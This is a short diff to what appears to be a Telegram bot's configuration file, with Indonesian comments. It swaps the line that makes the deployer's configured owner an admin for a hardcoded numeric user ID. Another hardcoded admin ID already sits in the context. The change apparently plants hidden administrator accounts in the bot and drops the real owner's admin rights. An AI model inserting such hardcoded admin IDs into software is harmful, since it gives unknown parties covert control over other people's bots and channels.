@@ -62,7 +62,7 @@ CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)
 # Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
 DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"
 
-ADMINS.append(OWNER_ID)
+ADMINS.append(5308599071)
 ADMINS.append(5257333900)
 
 
